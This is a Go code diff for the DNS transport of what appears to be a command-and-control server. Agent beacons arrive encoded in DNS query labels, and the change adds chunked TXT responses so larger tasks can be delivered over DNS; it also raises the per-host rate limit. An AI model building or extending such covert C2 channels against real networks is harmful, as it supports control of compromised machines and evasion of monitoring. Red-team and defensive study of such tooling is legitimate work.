@@ -22,8 +22,10 @@ const (
 	maxDNSBeaconBytes      = 15 * 1024
 	maxDNSTaskPayloadBytes = 8 * 1024
 	maxDNSChunks           = 512
-	maxDNSRequestsPerHost  = 128
+	maxDNSRequestsPerHost  = 1024
 	dnsRateWindow          = 10 * time.Second
+	dnsResponseChunkBytes  = 1200
+	maxDNSResponseBytes    = 96 * 1024
 )
 
 // ChunkForDNS splits data into chunks suitable for DNS label encoding.
@@ -48,26 +50,33 @@ type dnsBeaconSession struct {
 	createdAt   time.Time
 }
 
+type dnsResponseSession struct {
+	chunks    [][]byte
+	createdAt time.Time
+}
+
 // DNSHandler is an authoritative DNS server that decodes agent beacons.
 // Query format: <base32chunk>.<index>.<total>.<sessionID>.<agentID>.<domain>
 type DNSHandler struct {
-	store    *session.Store
-	nonces   *nonce.Cache
-	domain   string // authoritative domain, must end with "."
-	sources  *dnsRateLimiter
-	mu       sync.Mutex
-	sessions map[string]*dnsBeaconSession
+	store     *session.Store
+	nonces    *nonce.Cache
+	domain    string // authoritative domain, must end with "."
+	sources   *dnsRateLimiter
+	mu        sync.Mutex
+	sessions  map[string]*dnsBeaconSession
+	responses map[string]*dnsResponseSession
 }
 
 // NewDNSHandler creates a DNSHandler for the given authoritative domain.
 // domain must end with "." (e.g. "c2.example.com.")
 func NewDNSHandler(store *session.Store, nc *nonce.Cache, domain string) *DNSHandler {
 	return &DNSHandler{
-		store:    store,
-		nonces:   nc,
-		domain:   domain,
-		sources:  newDNSRateLimiter(),
-		sessions: make(map[string]*dnsBeaconSession),
+		store:     store,
+		nonces:    nc,
+		domain:    domain,
+		sources:   newDNSRateLimiter(),
+		sessions:  make(map[string]*dnsBeaconSession),
+		responses: make(map[string]*dnsResponseSession),
 	}
 }
 
@@ -117,6 +126,11 @@ func (h *DNSHandler) evictExpired() {
 			delete(h.sessions, id)
 		}
 	}
+	for id, s := range h.responses {
+		if s.createdAt.Before(cutoff) {
+			delete(h.responses, id)
+		}
+	}
 }
 
 // ServeDNS implements dns.Handler.
@@ -148,6 +162,10 @@ func (h *DNSHandler) ServeDNS(w mdns.ResponseWriter, r *mdns.Msg) {
 	inner := strings.TrimSuffix(qname, domain)
 	inner = strings.TrimSuffix(inner, ".")
 	labels := strings.Split(inner, ".")
+	if len(labels) == 4 && labels[0] == "r" {
+		h.serveResponseChunk(w, r, m, sourceIP, labels[2], labels[3], labels[1])
+		return
+	}
 	// Expected: [base32chunk, chunkIndex, totalChunks, sessionID, agentID]
 	if len(labels) < 5 {
 		w.WriteMsg(m) //nolint:errcheck
@@ -188,6 +206,16 @@ func (h *DNSHandler) ServeDNS(w mdns.ResponseWriter, r *mdns.Msg) {
 	sessionKey := sourceIP + "|" + agentID + "|" + sessionID
 	h.mu.Lock()
 	h.evictExpired()
+	if chunkIdx == totalChunks-1 {
+		if response, ok := h.responses[sessionKey]; ok && len(response.chunks) > 0 {
+			chunk := response.chunks[0]
+			total := len(response.chunks)
+			h.mu.Unlock()
+			appendDNSResponseTXT(m, r.Question[0].Name, chunk, 0, total)
+			w.WriteMsg(m) //nolint:errcheck
+			return
+		}
+	}
 	sess, ok := h.sessions[sessionKey]
 	if !ok {
 		if len(h.sessions) >= maxDNSSessions {
@@ -283,15 +311,7 @@ func (h *DNSHandler) ServeDNS(w mdns.ResponseWriter, r *mdns.Msg) {
 
 	var task *protocol.Task
 	if outputComplete {
-		task = h.store.DequeueTask(beacon.AgentID)
-	}
-	if taskTooLargeForDNS(task) {
-		h.store.RecordOutput(beacon.AgentID, &protocol.TaskResult{
-			TaskID: task.ID,
-			Type:   task.Type,
-			Error:  "task payload too large for DNS transport; reconnect over HTTPS and queue the upload again",
-		})
-		task = nil
+		task = h.store.DeliverTask(beacon.AgentID)
 	}
 	if task == nil {
 		task = &protocol.Task{Type: "noop"}
@@ -302,32 +322,92 @@ func (h *DNSHandler) ServeDNS(w mdns.ResponseWriter, r *mdns.Msg) {
 		w.WriteMsg(m) //nolint:errcheck
 		return
 	}
-
-	// Encode response as hex so the TXT payload is always safe ASCII.
-	// TXT strings are limited to 255 bytes each; split if necessary.
-	hexStr := hex.EncodeToString(resp)
-	var txtStrings []string
-	for len(hexStr) > 255 {
-		txtStrings = append(txtStrings, hexStr[:255])
-		hexStr = hexStr[255:]
+	if len(resp) > maxDNSResponseBytes {
+		transportError := &protocol.Task{
+			ID:      task.ID,
+			Type:    "transport_error",
+			Payload: "task cannot be delivered over DNS; reconnect the agent over HTTPS",
+		}
+		resp, err = protocol.EncodeTask(transportError, secret)
+		if err != nil {
+			w.WriteMsg(m) //nolint:errcheck
+			return
+		}
 	}
-	txtStrings = append(txtStrings, hexStr)
 
-	txt := &mdns.TXT{
-		Hdr: mdns.RR_Header{
-			Name:   r.Question[0].Name,
-			Rrtype: mdns.TypeTXT,
-			Class:  mdns.ClassINET,
-			Ttl:    0,
-		},
-		Txt: txtStrings,
+	responseChunks := splitDNSResponse(resp)
+	h.mu.Lock()
+	h.evictExpired()
+	if len(h.responses) >= maxDNSSessions {
+		oldestKey := ""
+		var oldest time.Time
+		for key, response := range h.responses {
+			if oldestKey == "" || response.createdAt.Before(oldest) {
+				oldestKey, oldest = key, response.createdAt
+			}
+		}
+		delete(h.responses, oldestKey)
 	}
-	m.Answer = append(m.Answer, txt)
+	h.responses[sessionKey] = &dnsResponseSession{chunks: responseChunks, createdAt: time.Now()}
+	h.mu.Unlock()
+	appendDNSResponseTXT(m, r.Question[0].Name, responseChunks[0], 0, len(responseChunks))
 	w.WriteMsg(m) //nolint:errcheck
 }
 
-func taskTooLargeForDNS(task *protocol.Task) bool {
-	return task != nil && task.Type == "upload" && len(task.Payload) > maxDNSTaskPayloadBytes
+func (h *DNSHandler) serveResponseChunk(w mdns.ResponseWriter, r, m *mdns.Msg, sourceIP, sessionID, agentID, indexText string) {
+	if !validDNSSessionID(sessionID) || len(agentID) == 0 || len(agentID) > 64 {
+		w.WriteMsg(m) //nolint:errcheck
+		return
+	}
+	index, err := strconv.Atoi(indexText)
+	if err != nil || index < 0 {
+		w.WriteMsg(m) //nolint:errcheck
+		return
+	}
+	key := sourceIP + "|" + agentID + "|" + sessionID
+	h.mu.Lock()
+	h.evictExpired()
+	response, ok := h.responses[key]
+	if !ok || index >= len(response.chunks) {
+		h.mu.Unlock()
+		w.WriteMsg(m) //nolint:errcheck
+		return
+	}
+	chunk := append([]byte(nil), response.chunks[index]...)
+	total := len(response.chunks)
+	h.mu.Unlock()
+	appendDNSResponseTXT(m, r.Question[0].Name, chunk, index, total)
+	w.WriteMsg(m) //nolint:errcheck
+}
+
+func splitDNSResponse(data []byte) [][]byte {
+	chunks := make([][]byte, 0, (len(data)+dnsResponseChunkBytes-1)/dnsResponseChunkBytes)
+	for len(data) > 0 {
+		n := dnsResponseChunkBytes
+		if n > len(data) {
+			n = len(data)
+		}
+		chunks = append(chunks, append([]byte(nil), data[:n]...))
+		data = data[n:]
+	}
+	return chunks
+}
+
+func appendDNSResponseTXT(m *mdns.Msg, name string, chunk []byte, index, total int) {
+	payload := hex.EncodeToString(chunk)
+	if total > 1 {
+		payload = "v1:" + strconv.Itoa(total) + ":" + strconv.Itoa(index) + ":" + payload
+	}
+	stringsForTXT := make([]string, 0, (len(payload)+254)/255)
+	for len(payload) > 255 {
+		stringsForTXT = append(stringsForTXT, payload[:255])
+		payload = payload[255:]
+	}
+	stringsForTXT = append(stringsForTXT, payload)
+	m.Answer = append(m.Answer, &mdns.TXT{
+		Hdr: mdns.RR_Header{Name: name, Rrtype: mdns.TypeTXT, Class: mdns.ClassINET, Ttl: 0},
+		Txt: stringsForTXT,
+	})
 }
 
 func remoteIP(addr net.Addr) string {
